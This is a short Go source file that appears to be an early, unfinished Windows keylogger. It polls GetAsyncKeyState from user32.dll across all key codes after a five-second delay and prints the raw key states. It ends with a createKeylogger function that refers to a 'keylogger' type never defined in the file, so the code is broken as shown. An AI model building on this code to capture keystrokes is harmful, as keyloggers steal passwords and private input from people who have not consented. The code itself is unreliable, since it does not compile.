package main

import (
	"fmt"
	"syscall"
	"time"
	//"github.com/AllenDang/w32"
)

var (
	user32             = syscall.NewLazyDLL("user32.dll")
	processessGetState = user32.NewProc("GetAsyncKeyState")
)

func main() {

	fmt.Println("Starting, get ready in 5 seconds")
	// wait for a bit
	time.Sleep(5000 * time.Millisecond)

	for key := 0; key <= 256; key++ {

		// get value, don't care about the other two values here
		value, _, _ := processessGetState.Call(uintptr(key))
		fmt.Print(value)
	}

}

// create a keylogger with the default values
func createKeylogger() keylogger {
	return keylogger{}
}
